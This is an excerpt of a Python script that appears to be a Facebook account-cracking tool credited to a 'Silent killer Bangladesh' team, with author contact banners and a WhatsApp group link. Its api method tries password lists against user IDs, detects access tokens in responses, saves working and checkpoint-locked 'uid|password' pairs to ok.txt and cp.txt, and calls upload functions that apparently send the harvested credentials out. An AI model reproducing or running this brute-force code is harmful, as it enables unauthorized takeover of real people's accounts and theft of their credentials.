...
def notice():
	...
	runtxt("\033[0;92m ADMIN MESSENGER🔰Md Alamgir hossen nishat")
	subprocess.check_output(["am", "start", "https://chat.whatsapp.com/Dxu91eJXcQvHR0wN3cN9ST"])
...
\033[1;90m══════════════════════════════════════════════════
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFACEBOOK : Md Alamgir Hossen Nishat
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFB GROUP : SKB TEAM Silent killer Bangladesh 
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mGITHUB   : Atalamin
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mWhatsapp  : 01915935712
\033[1;90m══════════════════════════════════════════════════
    """)
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [ALAMIN_OLD] : %s/%s -> \033[0;92m [ ALAMIN-OK:%s ]- \033[0;91m[ALAMIN-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				open("ok.txt","a").write(" [ALAMIN-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;91m[ALAMIN-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [ALAMIN-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
